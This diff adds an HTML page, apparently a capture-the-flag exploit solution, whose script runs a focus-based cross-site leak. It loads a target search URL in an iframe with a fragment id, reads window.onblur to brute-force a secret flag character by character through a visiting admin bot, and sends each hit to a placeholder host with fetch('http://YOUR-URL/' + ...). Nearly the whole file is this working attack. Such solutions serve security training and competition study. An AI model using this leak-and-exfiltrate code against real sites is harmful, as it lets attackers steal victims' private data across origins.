@@ -1,0 +1,56 @@
+<html>
+    <body>
+        <script> 
+            (async () => {
+                
+                const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_ ";
+
+                const leak = async (url) => {
+                    return new Promise(r => {
+                        let iframe = document.createElement('iframe')
+
+                        // we lost focus so id matches
+                        window.onblur = async () => {
+                            console.debug('onblur fired')
+                            window.onblur = ''
+                            // we need to wait so chrome dosnt crash when removing the iframe
+                            await sleep(10)
+                            iframe.remove()
+                            return r(1)
+                        }
+
+                        // no match
+                        setTimeout(() => {
+                            window.onblur = ''
+                            iframe.remove()
+                            return r(0)
+                        }, 150) // calibrate timeout based on server's admin bot
+
+                        iframe.src = `${url}#clear-output-button`
+
+                        document.body.appendChild(iframe)
+                    })
+                }
+
+                const sleep = (ms) => {
+                    return new Promise(resolve => setTimeout(resolve, ms));
+                }
+
+                // Repeat this for each letter to get the flag
+                let curr = 'CYBERLEAGUE{Save_The_Date_SEETF_Is_Happening_'
+
+                for (let i = 0; i < ALPHABET.length; i++) {
+                    let temp = curr + ALPHABET[i]
+                    console.log(`Trying: ${temp}`)
+
+                    if (await leak(`http://app/?search=${temp}`)) {
+                        
+                        // Exfiltrate
+                        fetch("http://YOUR-URL/" + temp)
+                        break
+                    }
+                }
+            })()
+        </script>
+    </body>
+</html>
